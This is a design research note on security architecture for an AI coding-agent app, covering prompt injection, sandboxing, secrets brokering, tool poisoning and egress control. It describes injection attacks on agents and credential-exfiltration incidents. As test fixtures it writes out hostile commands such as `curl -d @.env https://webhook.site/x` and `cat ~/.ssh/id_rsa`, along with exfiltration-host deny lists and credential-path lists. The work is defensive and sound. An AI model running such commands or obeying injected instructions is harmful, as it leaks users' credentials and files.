# 07 · Agent security and safety architecture

Research note for PandaCode. No code changes. Sources checked 2026-11-27 with web access.

Evidence tags: **[shipped]** production behaviour at a major lab/vendor · **[benchmark]** public
benchmark numbers · **[paper]** peer-reviewed · **[preprint]** arXiv, treat directionally ·
**[standard]** framework/agency/IETF document · **[tooling]** vendor write-up or practitioner benchmark.

PandaCode surfaces named below are real: `worker_approvals.rs` (`decide`, `always_asks`,
`LASTING_ONLY`), `bots/guard.rs` (`ALWAYS_ASK`), `secret_store.rs`, `credentials.rs` (SSH agent
brokering), `skills/safety.rs` + `skill_manager/safety.rs`, `browser.rs` (`allowed_url`,
`on_download(false)`), `agent_tools.rs` (`allow_cross_thread_team`), `architect.rs`
(`WORKER_PERMISSION_MODE = "full"`), `remote/config.rs`, `web_server.rs` (`DESKTOP_ONLY`),
`shell-intent-risk.ts` (`SEVERITY` 1–4, `isCriticalPath`, `isHomeConfig`), and `docs/approvals.md`.

---

## 0. The six facts that should drive the roadmap

| # | Finding | Number | Source |
|---|---|---|---|
| 1 | The class is unsolved at the model layer | OWASP LLM01:2025 says it is "unclear if there are fool-proof methods of prevention" | [OWASP LLM01](https://genai.owasp.org/llmrisk/llm01-prompt-injection/) **[standard]** |
| 2 | Model-layer defences fail adaptive attackers | 12 recent defences bypassed at **>90%** ASR; several reported near-zero | [Attacker Moves Second](https://arxiv.org/abs/2510.09023) **[preprint]** |
| 3 | Capability design is what holds | CaMeL: **77%** of AgentDojo tasks with provable security vs **84%** undefended | [CaMeL](https://arxiv.org/abs/2503.18813) **[preprint, DeepMind]** |
| 4 | Prompt transforms help, but are not a boundary | Spotlighting cuts indirect-injection ASR **>50% → <2%**, minimal task loss | [Spotlighting](https://arxiv.org/abs/2403.14720) **[paper, Microsoft]** |
| 5 | Humans stop reading approval prompts | **~93%** of Claude Code permission prompts approved; sandboxing cut prompts **84%** | [Containment](https://www.anthropic.com/research/how-we-contain-claude) **[shipped]** |
| 6 | Enforcement must be deterministic and outside the model | Every consequential Anthropic incident was **egress through a permitted path** | same **[shipped]** |

PandaCode's exposure is structural: workers always run `full`, their file scopes are *advisory*, hosts
grant **every** worker approval automatically, and the architect reads worker output — text an
injected worker controls — as teammate material. Add bots on four chat networks, remote devices with
"Full access for remote tasks", cloud sandboxes, VMs, a browser reading arbitrary pages and MCP
servers: the lethal trifecta exists in several surfaces at once. The framing that survives the
evidence is Meta's **Agents Rule of Two**: an agent should satisfy no more than two of (A) process
untrustworthy input, (B) reach private data, (C) change state or communicate externally; needing all
three means it must not act unsupervised ([Meta](https://ai.meta.com/blog/practical-ai-agent-security/),
from Willison's [lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/))
**[standard]**. Every PandaCode team worker is ABC-autonomous today.

---

## 1. Indirect injection: the attack, and which mitigations are real

Untrusted text arrives in a tool result, file, web page, issue, README, worker report or chat message
and is followed as if the operator wrote it. Willison's point is the design constraint: models "cannot
reliably distinguish the importance of instructions based on where they came from", and vendor examples
run from Microsoft 365 Copilot to GitHub's own MCP server **[tooling]**.

### 1.1 Instruction hierarchy — a training property, not a control

OpenAI defines the system > developer > user > tool ordering, generates synthetic conflicts, and
shows better robustness on unseen attacks with little capability loss
([arXiv:2404.13208](https://arxiv.org/abs/2404.13208)) **[paper]**. PandaCode owns no model: it
inherits whatever each harness ships. That is free defence-in-depth input quality, never the
boundary — and defences of this class are exactly what adaptive attacks break **[preprint]**.
*Cost:* nil. *Proposal:* state in `docs/approvals.md` that model-layer hierarchy is assumed-weak so
no permission design rests on it. *Signal:* one paragraph plus a PR review question.

### 1.2 Spotlighting, delimiting, provenance labels — cheap, real, non-binding

Transform untrusted text so provenance stays salient: fence it, datamark it (interleave a marker), or
encode it. Microsoft measured ASR **>50% → <2%** with minimal SQuAD/SuperGLUE/IMDB regression and
rated datamarking above plain delimiting **[paper]**; OWASP mitigation #6 is the same idea
**[standard]**. PandaCode has the seams: tool results, `pandacode_read_task` bodies, `list_subagents`
output, browser page text, MCP results, mailbox messages, `team_notes`, worker reports — all
ordinary text with no provenance cue. *Cost:* S; Rust for the tool-host and `agent_tools.rs`
formatters, TS for the transcript chip. *Proposal:* fence every untrusted result
(`<<<UNTRUSTED source="web">>> … <<<END>>>`) with a per-line `|` datamark for the highest-risk
sources, keep the text byte-exact inside, state the envelope in the system prompt, and show the same
chip in the transcript. *Signal:* 20 injected fixtures get the envelope 100%, trusted content 0%;
`tests/transcript-markup.test.mjs` goldens include it. Claim reduction, never prevention.

### 1.3 Dual-LLM and CaMeL-style capability separation

Split the agent: a privileged planner holding tools that only sees trusted input plus opaque handles,
and a quarantined reader with **no tools** producing validated primitives. CaMeL formalises it —
control and data flow come from the trusted query, so untrusted data cannot reach control flow, and
capabilities gate which data may reach which tool **[preprint]**; the six design patterns paper gives
the utility/security trade-off per pattern **[paper]**; Willison's original
[dual LLM](https://simonwillison.net/2023/Apr/25/dual-llm-pattern/) is the practitioner version.

PandaCode's architect/worker split is already two models — with the trust direction **inverted**:
worker output is treated as more trustworthy because it came from "inside". Anthropic names this
exactly ("if a sub-agent's output is treated as higher-trust … a new vector is introduced")
**[shipped]**. *Cost:* L for real CaMeL (interpreter, capability policies, handle types) — out of
scope for an app that does not own the agent loop; M for the plan-then-execute subset. *Proposal:* an
assignment declares its action set (write scopes, check names, tool families) at dispatch and may not
add a tool family mid-run without a lead follow-up, enforced at the tool host. *Signal:* a worker
calling outside its action set gets a decline with a reason the lead sees
(`worker_approvals/tests.rs`-style fixture).

### 1.4 Taint tracking / information-flow control

Label values and deterministically refuse bad flows. Microsoft's Fides gives the formal model,
characterises what dynamic taint tracking can enforce, and evaluates on AgentDojo **[paper]**, with a
shipped middleware framing **[shipped]**. PandaCode cannot label inside a harness's flat token stream,
but it *can* label at the boundary — which tool produced a string, which session carried it, whether
it crossed a thread — enough to enforce the two policies that matter: *untrusted data may not be an
argument to an egress-capable tool* and *a worker report may not become an approval justification*.
*Cost:* M–L, Rust at the tool host. *Proposal:* coarse per-message `provenance: trusted |
untrusted:<source>` plus session id; `pandacode_send_team_message`, `queue_message`, `steer_task`,
cloud CLI and browser typing reject arguments labelled `untrusted` whose destination differs from the
source session. *Signal:* two-sided Rust test — an injected web string cannot cross threads in one
turn, the same string typed by the user can.

### 1.5 Content-versus-control separation

Never let model output become protocol control. The MCP best-practices doc is the clearest normative
statement: reject `javascript:`/`data:`/`file:` authorization URLs, exact-match `redirect_uri`, bind
sessions to user id, forbid token passthrough
([MCP security](https://modelcontextprotocol.io/docs/2025-11-25/tutorials/security/security_best_practices))
**[standard]**; OWASP LLM05 is the general form. PandaCode is already mostly right —
`docs/agent-tools.md` says the browser takes "a finite action and data, never agent-provided JavaScript
or generic native IPC", and `allowed_url` restricts schemes and rejects embedded credentials — but
that invariant is prose in one doc. *Cost:* S. *Proposal:* an invariants block in the doc plus a Rust
guard that no JS-evaluating command exists on the agent-facing list.

---

## 2. Capability-based security and per-agent scoping

Authority should be an unforgeable, narrowly scoped, time-bounded grant rather than ambient "the app
can do it". OWASP LLM06 mitigation is exactly this list — minimise extensions, minimise
functionality, avoid open-ended extensions (never a general shell where a file-write tool suffices),
minimise permissions, execute in the user's context, **complete mediation** (authorise downstream,
not in the model) **[standard]**; the 2026 Agentic Top 10 elevates it to ASI02 Tool Misuse and ASI03
Identity & Privilege Abuse, both Critical.

Where PandaCode is missing it: workers run `full` and scopes are "advisory task boundaries, not an
operating-system filesystem sandbox" (`docs/architect-workers.md`); `worker_approvals.rs::decide`
grants any request offering an approve choice, so a worker's `curl … | sh` to a novel host is
auto-approved; "Full access for remote tasks" is one host-wide boolean; the bot Guard matches only
the request's first three words (`pattern_for`), with no notion of which directory or host.

*Cost & complexity:* M. Rust (enforcement lives in the tool host and launcher); TS for the envelope
editor. *Proposal — capability envelopes per worker.* Extend the existing `files` declaration to
`{read, write, exec[], network[], tools[]}`, enforced where PandaCode already sits between harness and
world: the MCP tool host, `shell-intent-risk.ts` (already parses commands, resolves paths, ranks
severity 1–4), and an egress decision. A worker's envelope defaults to its parent's and never widens
without an explicit lead decision recorded in the transcript — the rule already applied to *write
scopes*, applied to the whole envelope. *Signal:* an out-of-envelope write is refused with the path
named (fixture); an assignment declaring no envelope is rejected at dispatch; `WORKER_PERMISSION_MODE`
stays `full` because the envelope becomes the boundary.

---

## 3. Sandboxing: OS primitives and measured cost

| Rung | Measured cost / limit | Source |
|---|---|---|
| Per-command policy (no kernel boundary) | Zero cost, zero guarantee — prompt- and classifier-enforced only | — |
| OS sandbox (macOS `sandbox-exec`, Linux bwrap + seccomp) | Near-native, covers every subprocess, network only via proxy socket; **84%** fewer prompts | [Anthropic](https://www.anthropic.com/research/claude-code-sandboxing) **[shipped]** |
| …and its failure mode | An *allowed* domain accepted an attacker key and exfiltrated files — the allowlist, not the sandbox, failed | [Containment](https://www.anthropic.com/research/how-we-contain-claude) **[shipped]** |
| gVisor (`runsc`) | No CPU or memory-access cost; **structural syscall cost**, worst on syscall-bound work; Systrap ≫ ptrace | [gVisor perf](https://gvisor.dev/docs/architecture_guide/performance/) **[tooling]** |
| gVisor, third-party | Syscall-heavy loop **~5×** slower than runc; a Kata pod ran it ~3× faster — workload decides | [ComputingForGeeks](https://computingforgeeks.com/gvisor-vs-kata-containers-vs-runc/) **[tooling]** |
| microVM (Firecracker) | Boot **<125 ms**, ~**5 MiB** per instance, own kernel | [firecracker](https://github.com/firecracker-microvm/firecracker) **[tooling]** |
| Full VM (Cowork) | Highest isolation; credentials never enter the guest; EDR loses guest visibility | [Containment](https://www.anthropic.com/research/how-we-contain-claude) **[shipped]** |

Three post-mortems decide the design. (a) Project config parsed *before* the trust prompt — repo
hooks ran pre-consent; fix: defer parsing and execution of project-local configuration until the trust
prompt is accepted. (b) A phished prompt asked for `~/.aws/credentials` and a POST; **24 of 25 retries
succeeded** — only egress and filesystem held. (c) An allowlisted `api.anthropic.com` uploaded files
with an attacker-supplied key: "an allowlist is better conceptualized as a capability grant"
**[shipped]**. Anthropic's pairing rule: effective sandboxing needs **both** filesystem and network
isolation, because either alone leaves an escape.

PandaCode spawns harnesses with the user's own privileges and no kernel boundary, and workers are
unattended + full-access — the configuration both vendors say requires an environment boundary
*instead of* approvals. It also parses project-local config (`AGENTS.md`, project skills, harness
settings): the same pre-consent class. *Cost & complexity:* L, honestly: wrapping arbitrary installed
CLIs per OS is real work, and the harnesses increasingly ship their own sandboxes (Codex
Landlock+seccomp, Claude bwrap/seatbelt). Cheaper rungs first. *Proposal:* (1) **S — honesty layer**:
report per harness whether the selected mode is kernel-enforced or prompt-enforced, so "Full access"
is never mistaken for "sandboxed". (2) **M — default unattended workers into the local VM** the app
already has (`src-tauri/src/vm*`), checkout mounted, nothing else — the Cowork pattern. Keep
in-process sandboxing out of scope until harnesses expose a stable switch. *Signal:* Settings → Agents
shows the boundary per harness; a VM-dispatched worker cannot read `~/.ssh` (fixture); the transcript
records which boundary applied.

---

## 4. Secrets isolation and brokering

Credentials must never enter model context, transcript, database or webview; the agent asks a broker
for an *action* and the broker injects the secret — as a **proxy** (agent never holds one) or a
**short-lived mint** (narrow, expiring, non-renewable).

The IETF Credential Broker for Agents draft formalises both, splits the Policy Decision Point from
the Credential Delivery Point so compromising one does not yield the other, requires non-renewable
leases, DPoP sender-constrained tokens and immutable audit, and calls approval fatigue a human-factors
risk that "cannot be fully solved with technical controls"
([CB4A](https://www.ietf.org/archive/id/draft-hartman-credential-broker-4-agents-00.html))
**[standard, Informational]**. Its motivating incident — a credential stealer in an AI gateway's
PyPI packages harvesting SSH keys, cloud creds and LLM keys — is PandaCode's own dependency shape.
Anthropic: "if credentials never enter the sandbox, they can't be exfiltrated, regardless of whether
the cause is a user, a model … or an attacker" **[shipped]**.

PandaCode is 80% done: `secret_store.rs` states values "never enter prompts, logs, the database or
the webview", and `credentials.rs` hands children the **SSH agent socket** and never reads a private
key — brokering done right at one integration point. The gaps are the paths that bypass it: `full`
workers can read `secrets.json` (0600, same user), `.env`, `~/.aws/credentials`, `~/.ssh/id_*`,
`~/.netrc`; nothing redacts on the way out; MCP OAuth lives in harness configs. *Cost &
complexity:* M for rungs 1–2, L for 3; Rust. *Proposal, staged:* (1) **S** — a `credentialPaths`
class in `shell-intent-risk.ts` (`~/.ssh`, `~/.aws`, `~/.config/gh`, `.env*`, `*.pem`, `*.p12`,
`~/.netrc`, `~/.docker/config.json`, app data dir); a worker *reading* one is critical-tier and asks
the lead, and bots add it to the Guard's always-ask list. (2) **M** — one `redact()` pass over tool
results, transcript and activity rows (the skills scan already redacts in `safety_rules.rs`),
replacing matches with `«redacted:gh-token»`. (3) **L** — an action-level broker:
`pandacode_use_credential(name, action, args)` performs the call host-side and returns only the
response, starting with credentials PandaCode owns (relay, cloud CLIs, MCP OAuth). *Signal:* a
fixture token never appears verbatim in `get_messages` or activity; `cat ~/.ssh/id_rsa` is refused;
one brokered `git push` succeeds with the token in no transcript row.

---

## 5. Supply chain and tool poisoning

Three families, all real: a hostile server/skill whose *description* steers the model; a tool benign
at approval that changes later (rug pull); and name collision, where a hostile server ships a
plausible "secure" replacement. **43%** of tested public MCP servers had command-injection flaws and
**30%** allowed unrestricted URL fetching, with CVE-2025-6514 (`mcp-remote`, full client compromise)
and CVE-2025-49596 (MCP Inspector CSRF→RCE) named **[tooling]**; Elastic shows description-only
steering — a `daily_quote` docstring telling the model to skim 0.5% from another tool's payments, a
`side_note` parameter telling it to `grep` for `API_KEY` and append it **[tooling]**; CSA: "no native
MCP mechanism to detect or prevent these", clients "inherit trust … without continuous verification"
**[tooling]**. Skills are the same shape with worse hygiene: **36%** flawed and 1,467 vulnerable
skills with active payloads ([Snyk](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)),
**1,184** malicious skills in one marketplace distributing a macOS stealer in three months
**[tooling]** — and the payload is markdown, so there is nothing to sign. What works is pinning the
definition, diffing it, re-consenting on change; the MCP spec requires consent before configuration
executes and sandboxing for local servers **[standard]**, and OpenAI ships `prefix_rule` allowlists
with managed allow/deny domain lists **[shipped]**.

PandaCode has an unusual asset here: `skills/safety.rs` scans skill content with real rules
(`pipe-to-shell`, approval-bypass phrasing, `curl|sh`, `sandbox_mode = "danger-full-access"`),
quarantines, and keeps unreviewed skills out of bot briefs — better than most of the ecosystem. It
lacks the *drift* half: MCP inventories are discovered on demand but not fingerprinted, and skills are
scanned at install, not on later mutation. Its per-run MCP bridge (auth, loopback-bound, rejects
browser origins, closes with the run) is the right template. *Cost:* S–M, Rust. *Proposal — a
definition ledger:* hash each MCP tool (name + description + schema) and each skill file on first
sight; on every later load compare and mark `changed`, requiring re-review — the existing quarantine
interaction plus one table and one state, with a description redline in the card. *Signal:* a fixture
server whose description changes between loads becomes uncallable until re-approved; an unchanged
server prompts nothing; a skill edited after install is flagged.

---

## 6. Egress control and exfiltration paths

Anthropic's reframing is the one to adopt: an allowlist is "a capability grant", and every function
reachable through any allowed domain becomes attack surface **[shipped]**. OpenAI runs Codex with no
open-ended outbound access — managed allow/deny, ask for unfamiliar domains, `allow_local_binding`,
OTel on every proxy allow/deny **[shipped]**; Claude Code routes all network through a proxy outside the
sandbox on a unix socket; Stripe's Smokescreen is the spec-named reference **[standard]**.

**Covert channels, plainly.** A domain allowlist bounds HTTP exfiltration. It does not bound DNS
queries, timing/size side channels, allowed provider APIs (an attacker-supplied key to an allowed
host — Anthropic's actual incident), git push to an allowed remote, PR/issue creation on a forge,
image URLs rendered in the browser, or `pandacode_send_team_message` into another thread. No measured
defence closes these; the posture is enumerate, gate the high-value ones, accept the rest. Any
proposal claiming to *prevent* covert channels is speculative.

PandaCode has no egress concept at all: `browser.rs` restricts schemes and denies downloads, but an
agent's shell can `curl` anywhere, bots post to four networks, and cross-thread tools move text with
no user in the loop. *Cost:* M for policy + classifier, L for a proxy; Rust. *Proposal — default-deny
egress with per-task allow:* store `{deny: [pastebin, transfer.sh, ngrok, webhook.site,
*.requestbin], ask: [*], allow: [registry.npmjs.org, crates.io, github.com, configured remotes]}`
with the task; enforce in the shell classifier (flag `curl`/`wget`/`nc`/`ssh`/`git push` to a
non-allowed host as critical tier), `on_navigation`, and outgoing cross-thread app tools. No DNS-level
control; document the residual channel. *Signal:* `curl -d @.env https://webhook.site/x` asks or is
refused in **every** mode including full access (a new always-ask class beside `ALWAYS_ASK`);
`npm install` proceeds; a cross-thread message carrying page-derived text is refused.

---

## 7. Auditability and verifiable action logs

Append-only, agent-immutable record of what happened, why, and who authorised it; *verifiable* means
tamper-evident (hash chain / Merkle inclusion), not merely persisted. OWASP LLM06 lists logging plus
rate limiting as the damage-limiting pair **[standard]**; CB4A requires the log on a separate trust
boundary from policy and credentials, hash-chained, **fail-closed** when unavailable **[standard]**;
Codex exports agent-native telemetry (prompts, approval decisions, tool results, MCP usage, proxy
allow/deny) over OTel and triages it to separate expected behaviour from mistakes from escalation
**[shipped]**; Sigstore's Rekor is the mature prior art for tamper-evidence **[tooling]**.

PandaCode has three islands and no view: `bot_activity` (capped at 5,000 rows/bot), the worker
transcript notes from `worker_approvals.rs::record` ("each automatic decision, with the request's first
300 characters"), and `turn_changes` / `pandacode_track_files`. Each is good; none is queryable
together, none is agent-immutable (the agent's shell can edit the SQLite file), and the worker notes
are prose. *Cost:* M — one table, a chain hash, a query command, a view. *Proposal:* one `agent_audit`
table — `id, at, session_id, actor (user|lead|worker:<id>|bot:<id>|remote:<device>|schedule), kind
(approval|denial|tool|egress|credential|memory|settings), subject, decided_by, correlation_id,
prev_hash, hash` — written from the three existing call sites, shown as Settings → Activity → **Audit
log** with actor/correlation filters, exportable as JSONL. *Signal:* every automatic worker approval
appears with `actor: worker:<id>`, `decided_by: auto`, correlated to the tool call; deleting a row and
re-exporting fails chain verification.

---

## 8. Agent identity and delegation

Who acted, on whose authority, and can it be denied later? OWASP ASI03 (Critical) names credential
inheritance and weak privilege boundaries **[standard]**. CB4A builds on SPIFFE/SPIRE workload
identity with a signed per-request envelope (`who/what/why/TTL`) and is explicit that the
justification field is *evidence, not authorisation* — the policy decision must not read
agent-authored prose **[standard]**. Anthropic states the open question: own principal identity, or
extension of the user **[shipped]**. Five Eyes guidance (ACSC/CISA/NSA/Cyber Centre/NCSC-NZ/NCSC-UK,
30 Apr 2026) and the NIST AI RMF Generative AI Profile are the governance frame — inventory agents,
bound authority, log and monitor, keep a human accountable **[standard]**.

The plumbing exists and is disciplined: identities are "bound by the host", a request "only acts on
the run that raised it", remote devices have their own revocable token, bots pair per channel. What
is missing is the **delegation record**: nothing durable says "the user's authority was lent to
worker X for assignment Y at time T under lead L with envelope E". *Cost:* S, given §7. *Proposal:*
the record *is* an audit row — `actor: lead:<id>`, `kind: delegation`, `subject: worker:<id>`,
`decided_by: <model+harness>` — carrying the envelope hash and the initiating turn id; the same row
for a remote client starting a full-access task and a bot starting a scheduled run; expose "who
authorised this?" on the worker panel. *Signal:* one query returns user → lead → worker → sub-worker
with timestamps and envelopes.

---

## 9. Approval design that works (and the evidence it usually does not)

Fatigue is measured, not anecdotal. Anthropic telemetry: **~93%** of permission prompts approved, and
"the more approvals a user sees, the less attention they pay to each" **[shipped]**; the underlying
human-factors result is older and robust — habituation develops within a five-day workweek, visible in
fMRI and eye-tracking, with behavioural decline (Vance et al., MISQ 2018) **[paper]**. Too few prompts
is also a failure: Claude Code auto mode blocks ~0.4% of benign commands but lets ~17% of overeager
actions through, "one layer of defense-in-depth inside a sandbox, not a substitute for one"; model-layer
resistance is ~0.1% ASR single-attempt but **5–6% after 100 adaptive attempts** **[shipped]**. Structure
beats volume: CB4A's auto/HITL/MFA tiers with rate limits and "challenge approvals" **[standard]**;
Codex's `prefix_rule` allowlists and auto-review subagent **[shipped]**.

PandaCode's story is binary and inverted: a user's own task asks by mode, while a worker's request is
auto-approved with no risk tier and a 300-character note. The bot Guard is closer to right but matches
only the request's first line. *Cost & complexity:* S–M, mostly TS plus a Rust classifier. *Proposal,
cheapest first:* (1) **blast-radius preview** on every card — reuse `shell-intent-risk.ts`'s tiers and
reasons ("deletes the checkout", "overwrites a config file", "writes to a system path", "scratch
delete"), add files touched with +/− counts from a dry run where available, the egress host, and
whether the credential-path class is involved; label the tier textually, not by colour. (2)
**risk-tiered auto-answer** — keep auto-approval for tier 1 (read, scratch write, in-envelope edit) and
route tier 3 (destructive, out-of-envelope write, new egress host, credential read) to the **lead** as
a tool result it must handle, never to the user and never an automatic yes. (3) **prompt budget** —
count approvals granted per run and warn past ~25; fatigue is a rate problem, so make the rate visible.
*Signal:* destructive fixture names the lost data and the repo-root flag; an in-envelope write produces
no card; a worker's out-of-envelope write produces a lead-facing tool result and no auto-approval; the
count shows.

---

## 10. Multi-agent trust boundaries

Privileges must not silently inflate as work moves between agents. OWASP ASI07 (insecure inter-agent
communication) and ASI08 (cascading failures) **[standard]**; Anthropic names the exact failure —
treating a sub-agent's output as higher-trust "introduces a new vector" **[shipped]**. Where
PandaCode leaks, and what already holds:

| Leak | Where | Status |
|---|---|---|
| Worker output trusted by the lead | architect review turns | **Open** — §1.3 |
| Worker privileges = full whatever the lead's mode | `WORKER_PERMISSION_MODE` | Deliberate; needs §2 |
| Cross-thread tools driving a team-leading thread | `allow_cross_thread_team` | Gated on remote/bot full access |
| Remote client driving a full-access team | `remote/config.rs` | One host-wide boolean |
| Sub-agent scope wider than parent | dispatch validation | Yes for write scopes only |
| Peer messages read as instructions | mailbox / notes | Prose warning, not structural |

*Cost:* S for labelling, M for envelopes. *Proposal:* (a) apply §1.2's envelope to every team message,
note, checkpoint and worker report entering a model context; (b) make "untrusted task data, not
instructions" structural (label + §1.4 sink check) rather than a sentence in the brief; (c) replace
the single "Full access for remote tasks" boolean with a per-device envelope so one trusted laptop
does not grant every device the same reach. *Signal:* a mailbox message containing an override cannot
cause a cross-thread call in the same turn; a `read` device cannot start a `full` task even when
another device holds that grant.

---

## 11. Ranked shortlist

| Rank | Upgrade | Confidence | Cost | Why it wins |
|---|---|---|---|---|
| 1 | **Provenance envelope + taint sink check** (§1.2, §1.4) | **High** — spotlighting's >50%→<2% plus CaMeL/Fides' structural result; lands in the tool host PandaCode already owns | M | The only mitigation that survives an adaptive attacker, and it fixes the multi-agent trust inversion for free |
| 2 | **Per-worker capability envelope** (§2) | **High** — OWASP LLM06/ASI02/ASI03 are unanimous; the gap is already written down in `architect-workers.md` | M | Bounds unattended full-access workers without changing the mode story |
| 3 | **Secrets never in reach, never in text** (§4) | **High** — CB4A, OWASP LLM02, Anthropic's containment rule; half exists already in `credentials.rs` | S→L staged | Highest-severity single loss, cheapest first rung |
| 4 | **Risk-tiered approvals with blast-radius previews** (§9) | **Medium-high** — 93% approval rate and the habituation literature are solid; tier boundaries are judgment | S–M | Spends attention only where damage is irreversible, and makes fatigue measurable |
| 5 | **Definition ledger + one chained audit log** (§5, §7) | **Medium** — CSA: no native detection today; incident counts real; hash-pinning standard but the agent-specific payoff unmeasured | S–M | Closes rug-pull and skill drift that install-time scanning cannot see; §8's delegation record is a by-product |

Deferred: the egress proxy with per-task allow (§6 — the classifier rung is cheap, the proxy is a
subsystem), local-VM default for unattended workers (§3), and per-device envelopes (§10).

---

## 12. Rejected, or already covered

- **"A guardrail model will catch injection"** — not a boundary: auto mode misses ~17% of overeager
  actions and adaptive attacks bypass 12 defences at >90% ASR. One layer only (LlamaFirewall's
  PromptGuard 2 / AlignmentCheck split is a reasonable shape **[preprint]**).
- **Spotlighting as a guarantee** — it reduces, not eliminates, ASR. Never write "prevented".
- **Full CaMeL in-app** — needs an interpreter over a capability-typed plan, and PandaCode does not
  own the agent loop. §1.3's plan-then-execute subset captures most of the value.
- **Preventing covert channels** — unachievable (DNS, timing, allowed APIs, allowed forges). Bound the
  HTTP path, enumerate the rest, accept residual risk.
- **Worker file scopes as sandboxing** — already correctly documented as advisory; §2 enforces.
- **Making workers non-full-access** — wrong lever; a worker waiting on a human stalls the team. The
  envelope bounds what `full` means instead.
- **MFA for approvals (CB4A Tier 3)** — wrong for a local-first app with no accounts; at most a
  WebAuthn re-confirmation before a brokered credential action.
- **Claiming the audit log is immutable** — it is tamper-*evident*, not immune to local root.
- **Reading the agent's justification text to decide scope** — rejected, following CB4A: model prose
  is evidence for a human, never an authorisation input.
- **Replacing the `always_ask` / `lastingOnly` handling in `worker_approvals.rs`** — already correct
  and hard-won. Reuse its decline text and audit-note shape rather than adding a parallel mechanism.
- **Trusting a local MCP server because it is local** — Anthropic: any external resource is "two risks
  at once", and local servers run with the client's privileges **[shipped]**; the spec requires
  consent before configuration executes **[standard]**.

---

## Sources

1. OWASP LLM01:2025 Prompt Injection — https://genai.owasp.org/llmrisk/llm01-prompt-injection/
2. OWASP LLM06:2025 Excessive Agency — https://genai.owasp.org/llmrisk/llm062025-excessive-agency/
3. OWASP Top 10 for Agentic AI (ASI01–ASI10) — https://genai-security-project.github.io/crosswalk/agentic-ai-top10/
4. Simon Willison, The lethal trifecta for AI agents — https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/
5. Simon Willison, The Dual LLM pattern — https://simonwillison.net/2023/Apr/25/dual-llm-pattern/
6. Meta AI, Agents Rule of Two — https://ai.meta.com/blog/practical-ai-agent-security/
7. Debenedetti et al., Defeating Prompt Injections by Design (CaMeL) — https://arxiv.org/abs/2503.18813
8. Beurer-Kellner et al., Design Patterns for Securing LLM Agents — https://arxiv.org/abs/2506.08837
9. Costa et al., Securing AI Agents with Information-Flow Control (Fides) — https://arxiv.org/abs/2505.23643
10. Hines et al., Spotlighting — https://arxiv.org/abs/2403.14720
11. Wallace et al., The Instruction Hierarchy — https://arxiv.org/abs/2404.13208
12. Nasr et al., The Attacker Moves Second — https://arxiv.org/abs/2510.09023
13. Anthropic, Making Claude Code safer with sandboxing — https://www.anthropic.com/research/claude-code-sandboxing
14. Anthropic, How we contain Claude across products — https://www.anthropic.com/research/how-we-contain-claude
15. OpenAI, Running Codex safely at OpenAI — https://openai.com/index/running-codex-safely/
16. gVisor, Performance Guide — https://gvisor.dev/docs/architecture_guide/performance/
17. Firecracker microVM — https://github.com/firecracker-microvm/firecracker
18. gVisor vs Kata vs runc benchmark — https://computingforgeeks.com/gvisor-vs-kata-containers-vs-runc/
19. MCP, Security Best Practices (2025-11-25) — https://modelcontextprotocol.io/docs/2025-11-25/tutorials/security/security_best_practices
20. Elastic Security Labs, MCP tools: attack vectors and defenses — https://www.elastic.co/security-labs/threat-command/mcp-tools-attack-defense-recommendations
21. CSA, MCP Tool Poisoning — https://labs.cloudsecurityalliance.org/research/csa-research-note-mcp-tool-poisoning-ai-agent-exfiltration-2/
22. Snyk, ToxicSkills — https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/
23. CSA, Poisoned Skills: agent marketplace supply chain — https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-skill-supply-chain-attacks-20260624-csa/
24. IETF, Credential Broker for Agents (CB4A) — https://www.ietf.org/archive/id/draft-hartman-credential-broker-4-agents-00.html
25. NIST, AI RMF Generative AI Profile (AI 600-1) — https://nvlpubs.nist.gov/nistpubs/ai/NIST.AI.600-1.pdf
26. Five Eyes, Careful Adoption of Agentic AI Services — https://media.defense.gov/2026/Apr/30/2003922823/-1/-1/0/CAREFUL%20ADOPTION%20OF%20AGENTIC%20AI%20SERVICES_FINAL.PDF
27. Vance et al., Tuning Out Security Warnings (MISQ 2018) — https://misq.umn.edu/misq/article/42/2/355/1716/Tuning-Out-Security-Warnings-A-Longitudinal
28. Chainguard, What is Sigstore Rekor? — https://www.chainguard.dev/supply-chain-security-101/what-is-sigstore-rekor
29. Meta, LlamaFirewall — https://arxiv.org/abs/2505.03574
30. AgentDojo — https://arxiv.org/abs/2406.13352
